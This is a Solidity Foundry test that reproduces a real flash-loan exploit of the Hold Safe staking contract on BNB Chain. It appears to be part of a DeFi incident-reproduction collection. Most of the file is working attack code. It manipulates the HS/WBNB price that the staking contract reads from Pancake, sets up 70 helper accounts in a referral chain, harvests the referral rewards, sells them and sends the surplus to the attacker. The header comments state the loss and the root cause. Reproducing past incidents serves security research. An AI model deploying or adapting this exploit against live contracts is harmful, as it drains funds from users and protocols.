// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 4,824.96 USD
// Attacker : 0x0a4125690753b6cc82cadbca0f0899eb2025acb0
// Attack Contract : 0x8b6dc9db598ecc3aa36d3eddebe9a9dd36e2bd7d
// Vulnerable Contract : 0x2496b87189d5ae18d4d83b8a7039b0c8a07d98d4
// Attack Tx : https://bscscan.com/tx/0xa9b4cead820eaa750d72cd4ba4ba4d926c2db867746c637a1642ea4ab9721399
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x2496b87189d5ae18d4d83b8a7039b0c8a07d98d4#code
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1320
//
// Attack summary: the attacker flash-borrowed WBNB, bought HS, repeatedly created fresh staking
// accounts that deposited the maximum quoted USDT value in HS, built a referral chain, claimed
// referral rewards, sold the reward HS back to WBNB, repaid the flash source, and kept the surplus.
// Root cause: Hold_Safe.Stake and Rewards value HS deposits/rewards with Pancake getAmountsOut on a
// manipulable HS/WBNB/USDT route. A temporary reserve change lets cheap HS satisfy 2,000 USDT stake
// accounting, while referral rewards are later paid from the staking contract in HS.

address constant ATTACKER = address(uint160(0x000a4125690753b6cc82cadbca0f0899eb2025acb0));
address constant HISTORICAL_ATTACK_CONTRACT = address(uint160(0x008b6dc9db598ecc3aa36d3eddebe9a9dd36e2bd7d));
address constant DODO_WBNB_POOL = address(uint160(0x00172fcd41e0913e95784454622d1c3724f546f849));
address constant HOLD_SAFE_STAKING = address(uint160(0x002496b87189d5ae18d4d83b8a7039b0c8a07d98d4));
address constant HS_WBNB_PAIR = address(uint160(0x008720862a4fb7e1cbacfb42cb32c9eb4f5e84e403));
address constant PANCAKE_ROUTER = address(uint160(0x0010ed43c718714eb63d5aa57b78b54704e256024e));
address constant HS_TOKEN = address(uint160(0x00f83aa05d3d7a6ca2dce8a5329f7d1be879b215f0));
address constant WBNB_TOKEN = address(uint160(0x00bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c));
address constant USDT_TOKEN = address(uint160(0x0055d398326f99059ff775485246999027b3197955));

uint256 constant FLASH_WBNB_AMOUNT = 224 ether;
uint256 constant FLASH_WBNB_REPAY = 224_022_400_000_000_000_000;
uint256 constant MAX_STAKE_USDT = 2_000 ether;
uint256 constant FIRST_HELPER_FUNDING = 33_368_767_355_577_024;
uint256 constant STAKER_COUNT = 70;
uint256 constant REWARD_CLAIM_COUNT = 57;

interface IPancakeRouterFeeOnTransfer {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IHoldSafeStaking {
    function Stake(uint256 usdtAmount, address referrer) external;
    function Rewards() external;
    function referrerRewards(
        address account
    ) external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 51_758_376;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = WBNB_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(DODO_WBNB_POOL, "DODO WBNB pool");
        vm.label(HOLD_SAFE_STAKING, "Hold Safe staking");
        vm.label(HS_WBNB_PAIR, "HS/WBNB pair");
        vm.label(PANCAKE_ROUTER, "Pancake router");
        vm.label(HS_TOKEN, "HS");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(USDT_TOKEN, "USDT");
    }

    function testExploit() public balanceLog {
        uint256 dodoWbnbBefore = IERC20(WBNB_TOKEN).balanceOf(DODO_WBNB_POOL);
        uint256 attackerWbnbBefore = IERC20(WBNB_TOKEN).balanceOf(ATTACKER);

        assertGe(dodoWbnbBefore, FLASH_WBNB_AMOUNT);

        HoldSafeAttack attack = new HoldSafeAttack(ATTACKER);

        vm.prank(DODO_WBNB_POOL);
        IERC20(WBNB_TOKEN).transfer(address(attack), FLASH_WBNB_AMOUNT);

        attack.execute();

        uint256 attackerProfit = IERC20(WBNB_TOKEN).balanceOf(ATTACKER) - attackerWbnbBefore;
        assertEq(IERC20(WBNB_TOKEN).balanceOf(DODO_WBNB_POOL), dodoWbnbBefore + (FLASH_WBNB_REPAY - FLASH_WBNB_AMOUNT));
        assertGt(attackerProfit, 5 ether);
    }
}

contract HoldSafeAttack {
    address private immutable profitReceiver;
    StakeHelper[] private helpers;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
        IERC20(WBNB_TOKEN).approve(PANCAKE_ROUTER, type(uint256).max);
        IERC20(HS_TOKEN).approve(PANCAKE_ROUTER, type(uint256).max);
    }

    function execute() external {
        address[] memory wbnbToHs = new address[](2);
        wbnbToHs[0] = WBNB_TOKEN;
        wbnbToHs[1] = HS_TOKEN;

        IPancakeRouterFeeOnTransfer(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLASH_WBNB_AMOUNT, 1, wbnbToHs, address(this), block.timestamp + 1 hours
        );

        StakeHelper first = new StakeHelper();
        helpers.push(first);

        uint256 initialHs = IERC20(HS_TOKEN).balanceOf(address(this));
        IERC20(HS_TOKEN).transfer(address(first), FIRST_HELPER_FUNDING);
        first.stake(address(0), address(this));

        uint256 retainedHs = initialHs - FIRST_HELPER_FUNDING;
        address previousReferrer = address(first);

        for (uint256 i = 1; i < STAKER_COUNT; i++) {
            StakeHelper helper = new StakeHelper();
            helpers.push(helper);

            uint256 cycleAmount = IERC20(HS_TOKEN).balanceOf(address(this)) - retainedHs;
            IERC20(HS_TOKEN).transfer(address(helper), cycleAmount);
            helper.stake(previousReferrer, address(this));
            previousReferrer = address(helper);
        }

        address[] memory hsToWbnb = new address[](2);
        hsToWbnb[0] = HS_TOKEN;
        hsToWbnb[1] = WBNB_TOKEN;

        for (uint256 i = 0; i < REWARD_CLAIM_COUNT; i++) {
            if (IHoldSafeStaking(HOLD_SAFE_STAKING).referrerRewards(address(helpers[i])) == 0) continue;
            helpers[i].claimRewards(address(this));
            uint256 hsBalance = IERC20(HS_TOKEN).balanceOf(address(this));
            if (hsBalance > 0) {
                IPancakeRouterFeeOnTransfer(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    hsBalance, 1, hsToWbnb, address(this), block.timestamp + 1 hours
                );
            }
        }

        uint256 wbnbBalance = IERC20(WBNB_TOKEN).balanceOf(address(this));
        require(wbnbBalance > FLASH_WBNB_REPAY, "unprofitable");
        IERC20(WBNB_TOKEN).transfer(DODO_WBNB_POOL, FLASH_WBNB_REPAY);
        IERC20(WBNB_TOKEN).transfer(profitReceiver, IERC20(WBNB_TOKEN).balanceOf(address(this)));
    }
}

contract StakeHelper {
    function stake(address referrer, address receiver) external {
        IERC20(HS_TOKEN).approve(HOLD_SAFE_STAKING, type(uint256).max);
        IHoldSafeStaking(HOLD_SAFE_STAKING).Stake(MAX_STAKE_USDT, referrer);
        IERC20(HS_TOKEN).transfer(receiver, IERC20(HS_TOKEN).balanceOf(address(this)));
    }

    function claimRewards(
        address receiver
    ) external {
        IHoldSafeStaking(HOLD_SAFE_STAKING).Rewards();
        IERC20(HS_TOKEN).transfer(receiver, IERC20(HS_TOKEN).balanceOf(address(this)));
    }
}
